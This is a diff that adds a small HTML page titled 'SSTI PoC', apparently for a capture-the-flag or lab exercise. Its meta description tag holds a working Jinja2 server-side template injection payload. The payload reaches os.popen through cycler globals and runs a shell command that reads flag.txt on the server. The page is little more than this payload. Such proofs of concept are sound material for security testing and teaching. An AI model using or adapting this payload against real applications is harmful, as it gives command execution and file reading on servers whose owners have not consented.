@@ -1,0 +1,13 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>SSTI PoC</title>
+    <meta name="description" content="{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}">
+</head>
+
+<body>
+    <h1>SSTI Test Page</h1>
+</body>
+
+</html>
